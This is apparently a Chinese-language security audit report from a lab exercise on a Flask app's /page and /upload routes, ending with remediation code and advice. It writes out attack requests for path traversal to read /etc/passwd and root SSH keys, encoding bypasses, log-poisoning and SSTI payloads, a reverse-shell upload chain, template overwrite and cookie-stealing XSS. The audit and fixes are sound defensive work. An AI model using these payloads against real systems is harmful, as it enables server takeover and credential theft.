## 二、漏洞详情

### 【漏洞 1】LFI 目录穿越读取任意文件（CWE-22/CWE-98）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name={path}` |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **CWE-98** | Improper Control of Filename for Include/Require Statement |

#### 形成原理

`/page` 路由（第 369-385 行）直接将用户输入的 `name` 参数拼接到文件路径中，**未做任何过滤**：

```python
@app.route("/page")
def page():
    name = request.args.get("name", "")        # ← 用户完全控制
    filepath = os.path.join("pages", name)     # ← 无 . / .. 检测
    ...
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()                     # ← 任意文件读取
    return render_template("index.html", user=user,
                           page_content=content)  # ← 内容回显
```

`os.path.join("pages", "../../etc/passwd")` 在 Python 中不会拦截 `..` 段，操作系统解析后等效于 `../etc/passwd`，从而实现目录穿越。

#### 攻击利用方式

**场景 A — 读取系统密码文件**
```
GET /page?name=../../etc/passwd
→ 回显示例：
  root:x:0:0:root:/root:/bin/bash
  ...
```

**场景 B — 读取 SSH 私钥（服务器直接沦陷）**
```
GET /page?name=../../root/.ssh/id_rsa
→ 返回 root 用户的 SSH 私钥（明文）
```

**场景 C — 读取应用源码**
```
GET /page?name=../../app.py
→ 获取完整后端源码，包括数据库结构、USERS 字典（含密码哈希）、secret_key
```

**场景 D — 读取系统日志**
```
GET /page?name=../../var/log/auth.log
→ 获取系统认证日志，可用于分析登录模式
```

**场景 E — 读取数据库文件**
```
GET /page?name=../data/users.db
→ 下载 SQLite 数据库文件
```

#### 安全危害

- **SSH 私钥泄露** → 攻击者可 SSH 登录服务器 → **服务器完全沦陷**
- **源码泄露** → 分析所有业务逻辑、密钥、数据库结构
- **密码哈希泄露** → 离线破解后直接登录管理员账户
- **系统配置文件泄露** → 扩大攻击面

### 【漏洞 2】SSH 私钥泄露致服务器沦陷（CWE-522）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name=../../root/.ssh/id_rsa` |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-522: Insufficiently Protected Credentials |

#### 形成原理

应用以 root 权限运行（端口 5000），LFI 漏洞可直接读取 `/root/.ssh/id_rsa`。攻击者拿到私钥后使用 `ssh -i id_rsa root@<server_ip>` 即可获得服务器 root shell。

#### 攻击利用方式

```
Step 1: 读取 SSH 私钥
GET /page?name=../../root/.ssh/id_rsa

响应：-----BEGIN OPENSSH PRIVATE KEY-----
      b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
      ...（完整私钥内容）

Step 2: 保存为 id_rsa 并设置权限
$ chmod 600 id_rsa

Step 3: SSH 登录服务器
$ ssh -i id_rsa root@<target_ip>
root@target:~#   ← 已获得 root shell
```

#### 安全危害

- 服务器操作系统级别沦陷
- 攻击者可安装后门、挖矿程序、勒索软件
- 可横向移动攻击内网其他主机
- 可删除/篡改/加密所有业务数据

### 【漏洞 3】多重路径编码绕过（CWE-174）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name={encoded_path}` |
| **风险等级** | ⚠️ **高危** |
| **CWE** | CWE-174: Double Decoding of the Same Data |

#### 形成原理

Flask 会自动对 URL 参数进行一次 URL 解码，但攻击者可利用双层编码或双斜杠方式绕过简单的关键词黑名单（假设未来添加了过滤，此处为前瞻分析）。

#### 攻击利用方式

**方式 A — 双层 URL 编码绕过**
```
原始：../
一次 URL 编码：%2e%2e%2f
二次 URL 编码（双编码）：%252e%252e%252f

GET /page?name=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
→ Flask 解码一次为 %2e%2e%2f... → open() 系统调用解码为 ../
→ 成功绕过假设的 % 过滤
```

**方式 B — 双斜杠路径绕过**
```
GET /page?name=....//....//....//etc/passwd
→ 某些过滤机制仅检查 "../" 而不检查 "..//"
→ 系统解析后等效于 ../../../
```

**方式 C — 绝对路径直接读取**
```
GET /page?name=/etc/passwd
→ os.path.join("pages", "/etc/passwd") → "/etc/passwd"
→ Python 中若第二个参数以 / 开头，os.path.join 返回第二个参数本身
```

### 【漏洞 4】伪协议适用性分析（PHP vs Python 对比）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name={protocol_wrapper}` |
| **风险等级** | ℹ️ **中危（环境依赖）** |
| **CWE** | CWE-98: Improper Control of Filename for Include/Require Statement |

#### 形成原理

该漏洞系统为 **Python Flask** 应用，`open()` 函数不支持 PHP 风格的伪协议包装器。但作为安全审计规范，仍需进行全面的伪协议测试并记录。以下为 PHP 场景下可用的四大伪协议与本系统的实作差异：

| 协议 | PHP 环境下效果 | Python Flask 环境下是否生效 | 说明 |
|:----:|---------------|:--------------------------:|------|
| `file://` | 读取任意文件 | ❌ 不生效 | `open("file:///etc/passwd")` 不识别 `file://` 协议（除非用 `urllib`） |
| `data://` | 嵌入 base64 数据实现无文件木马 | ❌ 不生效 | `open()` 不识别 `data://` 协议 |
| `php://filter` | base64 编码读取 PHP 源码 | ❌ 不生效 | `php://` 是 PHP 内置协议，Python 无此概念 |
| `http://` | 远程文件包含实现 RFI | ❌ 不生效 | `open("http://192.168.1.100/shell.txt")` 不支持 HTTP |

**结论**：本系统为 Python Flask 架构，PHP 伪协议不适用。但 LFI 目录穿越（漏洞 1）已完全覆盖文件读取需求，无需依赖伪协议。PHP 协议在报告中列出作为安全审计完整性参考。

### 【漏洞 5】日志投毒 + LFI 远程代码执行（CWE-73/CWE-98）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | 日志投毒点 + `GET /page?name={log_file}` |
| **风险等级** | ⚠️ **高危** |
| **CWE** | CWE-73: External Control of File Name or Path |

#### 形成原理

攻击者利用系统日志文件（如 SSH 日志 `/var/log/auth.log`、Apache/Nginx 访问日志）注入恶意代码，再通过 LFI 漏洞包含该日志文件，使日志中的代码被执行。

#### 攻击利用方式

**场景 A — SSH 日志投毒（需有 SSH 访问知识）**
```
Step 1: 向 SSH 日志注入恶意 Python 代码
$ ssh "<?php system($_GET['cmd']); ?>"@<target_ip>
# 或对于本 Flask 应用，注入可被 Jinja2 模板引擎利用的 payload
$ ssh "{{ ''.__class__.__mro__[2].__subclasses__() }}"@<target_ip>
# SSH 认证失败记录会写入 /var/log/auth.log：
# Failed password for invalid user {{ SSTI_PAYLOAD }} from ...

Step 2: 通过 LFI 包含日志文件
GET /page?name=../../var/log/auth.log
→ 日志内容被读入 page_content 并渲染
→ 若 payload 在 Jinja2 模板上下文中被执行 → RCE
```

**场景 B — HTTP Referer / User-Agent 投毒**
```
Step 1: 发送包含恶意 payload 的 HTTP 请求
GET / HTTP/1.1
Host: target
User-Agent: <?php echo shell_exec($_GET['cmd']); ?>

# 如果存在 Web 服务器访问日志，记录 User-Agent

Step 2: LFI 包含 Web 日志
GET /page?name=../../var/log/apache2/access.log
```

#### 安全危害

- 从文件读取升级为**远程代码执行**
- 攻击者可执行任意系统命令
- 配合提权可获得完全服务器控制权

### 【漏洞 6】内网穿透 + RFI 攻击链路（Kali 攻击机场景）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page` + 内网 Kali |
| **风险等级** | ⚠️ **高危** |
| **CWE** | CWE-98: Remote File Inclusion |

#### 形成原理

虽然 Python `open()` 不支持 HTTP 协议直接包含远程文件，但攻击者可结合以下方式实现等效 RFI：

1. **先利用 LFI 读取 SSH 私钥**（漏洞 2）
2. **SSH 登录服务器后上传恶意文件**到 `pages/` 目录
3. **通过 `/page` 触发执行恶意文件中的代码**
4. 或通过 LFI 获取系统足够信息后，利用其他漏洞组合实现 RCE

#### 攻击利用方式（Kali 内网穿透攻击链路）

```

│                       攻击链拓扑                              │

│    │ ② LFI 读取 id_rsa                                       │
│    │ GET /page?name=../../root/.ssh/id_rsa                   │
│    │                                                         │
│    │ ③ chmod 600 id_rsa && ssh -i id_rsa root@target         │
│    │    → 获得 root shell（内网穿透完成）                     │
│    │                                                         │
│    │ ④ 上传反弹 Shell 脚本到 pages/ 目录                      │
│    │ scp -i id_rsa shell.py root@target:/opt/Class01/pages/  │
│    │                                                         │
│    │ ⑤ 触发恶意文件                                          │
│    │ GET /page?name=shell.py                                 │
```

### 【漏洞 7】XSS 反射型 — page_content 无过滤渲染（CWE-79）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name={html_file_with_xss}` |
| **风险等级** | ⚠️ **中危** |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |

#### 形成原理

`index.html` 使用 `{{ page_content | safe }}` 渲染页面内容，Jinja2 的 `| safe` 过滤器会**禁用 HTML 转义**，使得文件内容中的任意 HTML/JavaScript 被直接执行。

```html
{% if page_content %}
<div class="card">
    <div class="page-content">
        {{ page_content | safe }}    ← 无转义，直接渲染
    </div>
</div>
{% endif %}
```

#### 攻击利用方式

**场景 A — 反射型 XSS（读取含恶意 HTML 的文件）**
```
假设攻击者能上传或写入一个含 JS 的 HTML 文件到 pages/：
echo '<script>alert(document.cookie)</script>' > pages/xss.html

GET /page?name=xss
→ 执行 JS，弹窗显示当前用户 session Cookie
```

**场景 B — 结合 LFI 读取恶意文件触发 XSS**
```
攻击者通过其他方式（如日志投毒）在日志中注入 JS payload
GET /page?name=../../var/log/syslog
→ 若日志包含 <script> 标签，则在浏览器中执行
```

#### 安全危害

- 窃取登录用户的 Session Cookie
- 可构造钓鱼页面窃取用户凭证
- 可实现用户浏览器端的操作劫持

### 【漏洞 8】上传文件名路径穿越（CWE-22/CWE-434）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /upload` |
| **风险等级** | ⚠️ **高危** |
| **CWE** | CWE-22: Path Traversal / CWE-434: Unrestricted File Upload |

#### 形成原理

`/upload` 路由（第 388-413 行）虽然做了扩展名白名单校验，但**未对文件名进行路径穿越字符过滤**：

```python
filepath = os.path.join("static/uploads", file.filename)
file.save(filepath)
```

如果攻击者将文件名构造为 `../../templates/evil.html`，文件将被保存到 `templates/` 目录，覆盖或新增模板文件。

#### 攻击利用方式

```
Step 1: 抓包修改上传请求的文件名
原始：avatar.jpg
篡改：../../templates/evil.html

POST /upload
Content-Type: multipart/form-data
...
Content-Disposition: form-data; name="avatar"; filename="../../templates/evil.html"

文件实际保存路径：static/uploads/../../templates/evil.html → templates/evil.html

Step 2: 访问该模板触发渲染
成功上传后 Jinja2 模板被覆盖或新增

Step 3: 在 evil.html 中嵌入 SSTI  payload
{{ ''.__class__.__mro__[2].__subclasses__()[X]('id').read() }}
→ 访问触发模板渲染 → RCE
```

#### 安全危害

- **覆盖 Jinja2 模板** → 服务器端模板注入（SSTI）→ RCE
- 覆盖 `app.py`（如果穿越路径更深）→ 修改应用逻辑
- 写入恶意文件到任意目录

### 【漏洞 9】上传文件内容未检测（CWE-434）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /upload` |
| **风险等级** | ⚠️ **高危** |
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |

#### 形成原理

扩展名白名单仅校验文件后缀，但**未检查文件真实内容**（未检测 Magic Number / MIME Type）。攻击者可将恶意文件伪装为图片上传，例如：

- 图片马：`shell.php` 改为 `shell.jpg`，内容中包含 PHP 代码
- Python 马：`.py` 改为 `.jpg`

虽然当前系统不会直接执行 `.jpg` 文件，但在以下场景下构成威胁：
1. 结合漏洞 8（路径穿越）将文件写入可执行目录
2. 结合 LFI（漏洞 1）读取并渲染恶意图片马 → XSS/RCE

```
# 创建一个"图片马"——实际是 Python 代码的 jpg 文件
echo 'print("恶意代码执行")' > exploit.jpg
上传该文件，路径穿越写入 templates/ → 触发 SSTI
```

### 【漏洞 10】上传文件可被直接公开访问（CWE-552）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `/static/uploads/{filename}` |
| **风险等级** | ⚠️ **中危** |
| **CWE** | CWE-552: Files or Directories Accessible to External Parties |

#### 形成原理

Flask 默认将 `/static/` 路径映射为静态文件服务目录。所有上传的头像文件均可直接被匿名用户访问：

```
GET /static/uploads/2026_03_31_20_21_43_8193924.jpeg
→ 任何人可以直接查看用户头像（虽然头像本身不敏感）
```

更严重的是，若攻击者上传了恶意文件（即使扩展名为白名单），也可通过该 URL 直接引用：

```
GET /static/uploads/exploit.html
→ 可作为钓鱼入口
```

```
│                    完整入侵攻击链（7 步接管服务器）                     │
```

## 四、漏洞根因分析

| 漏洞编号 | 根因 | 不安全代码 |
|:-------:|------|-----------|
| 漏洞 1 | 用户输入直接拼接到文件路径，未做路径合法性校验 | `os.path.join("pages", name)` — name 未经任何过滤 |
| 漏洞 2 | LFI + 服务器以 root 运行 + SSH 私钥可被读取 | 无文件读取权限限制 |
| 漏洞 3 | 缺乏输入规范化，Flask 自动 URL 解码 + 系统双解码 | 无 `..` / `/` 白名单校验 |
| 漏洞 4 | 未做伪协议/非预期输入校验 | 无 URI scheme 黑名单 |
| 漏洞 5 | 文件可被读取 + 渲染时无沙箱 | `{{ page_content \| safe }}` 直接渲染 |
| 漏洞 6 | 无权限校验 + 无文件类型限制 | 同上（依赖漏洞 1 和 2） |
| 漏洞 7 | `\| safe` 过滤器禁用 HTML 转义 | `{{ page_content \| safe }}` |
| 漏洞 8 | 仅校验扩展名，未校验文件名中的路径穿越字符 | `os.path.join("static/uploads", file.filename)` |
| 漏洞 9 | 仅校验扩展名，未校验文件内容 | 只检查 `ext`，无 Magic Number 检测 |
| 漏洞 10 | Flask 默认静态文件路由暴露上传目录 | `/static/` 映射为公开路由 |

### 5.1 /page 路由修复代码（直接替换）

```python
import os

# 安全的白名单路径
ALLOWED_PAGES = {"help", "about", "faq"}
PAGE_DIR = os.path.abspath("pages")

@app.route("/page")
def page():
    name = request.args.get("name", "")
    if not name:
        return "缺少 name 参数", 400

    # [修复] 白名单校验：仅允许预定义页面名
    if name not in ALLOWED_PAGES:
        return "页面不存在", 404

    # [修复] 使用安全路径拼接，防止目录穿越
    filepath = os.path.join(PAGE_DIR, name + ".html")

    # [修复] 确保文件在 pages 目录内（二次防护）
    real_path = os.path.realpath(filepath)
    if not real_path.startswith(PAGE_DIR):
        return "页面不存在", 403

    try:
        with open(real_path, "r", encoding="utf-8") as f:
            content = f.read()
    except FileNotFoundError:
        return "页面不存在", 404

    # [修复] 移除 | safe 过滤，或使用 bleach 白名单清洗
    import bleach
    allowed_tags = ["h2", "h3", "p", "b", "hr", "br", "ul", "ol", "li"]
    content = bleach.clean(content, tags=allowed_tags, strip=True)

    username = session.get("username")
    user = USERS.get(username) if username else None
    return render_template("index.html", user=user, page_content=content)
```

### 5.3 /upload 路由修复

```python
import uuid

@app.route("/upload", methods=["GET", "POST"])
def upload():
    if not session.get("username"):
        return redirect("/login")
    if request.method == "POST":
        if "avatar" not in request.files:
            return render_template("upload.html", error="请选择文件")
        file = request.files["avatar"]
        if file.filename == "":
            return render_template("upload.html", error="文件名为空")

        # [修复] 扩展名白名单校验
        ALLOWED_EXT = {"jpg", "jpeg", "png", "gif", "webp", "bmp"}
        ext = file.filename.rsplit(".", 1)[-1].lower() if "." in file.filename else ""
        if ext not in ALLOWED_EXT:
            return render_template("upload.html",
                error=f"仅允许上传图片文件（{', '.join(sorted(ALLOWED_EXT))}）")

        # [修复] 校验文件内容 Magic Number
        magic_bytes = file.read(8)
        file.seek(0)
        MAGIC_MAP = {
            b"\xff\xd8\xff": "jpg",
            b"\x89PNG\r\n\x1a\n": "png",
            b"GIF87a": "gif",
            b"GIF89a": "gif",
            b"RIFF": "webp",
            b"BM": "bmp",
        }
        detected_ext = None
        for magic, fext in MAGIC_MAP.items():
            if magic_bytes.startswith(magic):
                detected_ext = fext
                break
        if detected_ext is None or detected_ext != ext:
            return render_template("upload.html", error="文件内容与扩展名不匹配"), 400

        # [修复] 使用 UUID 重命名文件，防止路径穿越
        safe_filename = f"{uuid.uuid4().hex}.{ext}"
        os.makedirs("static/uploads", exist_ok=True)
        filepath = os.path.join("static/uploads", safe_filename)
        file.save(filepath)

        url = f"/{filepath.replace(os.sep, '/')}"
        username = session.get("username")
        if username in USERS:
            USERS[username]["avatar"] = url
        return redirect("/")
    return render_template("upload.html")
```

## 六、整体审计结论

### 6.1 安全现状

本次审计发现 `/page` 文件包含路由存在 **1 个紧急漏洞（LFI 目录穿越）**，可直接读取服务器任意文件，配合 SSH 私钥泄露可在数分钟内完成服务器完全接管。这是当前系统中**风险等级最高的漏洞**，远高于此前发现的所有业务逻辑漏洞。

### 6.2 关键风险排序

| 风险 | 严重程度 | 描述 |
|------|:--------:|------|
| 🔴 LFI → SSH 私钥 → 服务器沦陷 | **极危** | 攻击者直接获得操作系统 root 权限 |
| 🔴 上传路径穿越 → 模板覆盖 → SSTI → RCE | **极危** | 上传恶意文件覆盖模板导致远程代码执行 |
| 🟠 上传无内容校验 → 任意文件上传 | **高危** | 结合其他漏洞造成 RCE |
| 🟠 LFI 读取任意文件 → 全量数据泄露 | **高危** | 数据库、源码、密码哈希全部暴露 |

### 6.3 修复效果（修复后）

| 修复措施 | 效果 |
|---------|------|
| `/page` 白名单校验 | 仅允许预定义的页面名，目录穿越完全阻断 |
| 上传文件 UUID 重命名 | 路径穿越和文件名篡改完全阻断 |
| Magic Number 校验 | 文件内容与扩展名不符时拒绝上传 |
| 移除 `\| safe` | XSS 和日志投毒 SSTI 完全阻断 |

### 6.4 最终建议

1. **立即修复 `/page` 路由**（P0）—— 这是当前系统最紧急的安全风险
2. **立即修复 `/upload` 路径穿越**（P0）—— 已有预置上传文件，风险现实存在
3. **服务器不应以 root 运行应用**——建议使用非特权用户运行 Flask 进程
4. **定期轮换 SSH 密钥**——即使当前私钥已泄露也可降低损失
5. **增加 WAF/IPS 规则**——拦截 URL 中的 `../`、`%2e%2e%2f` 等路径穿越特征
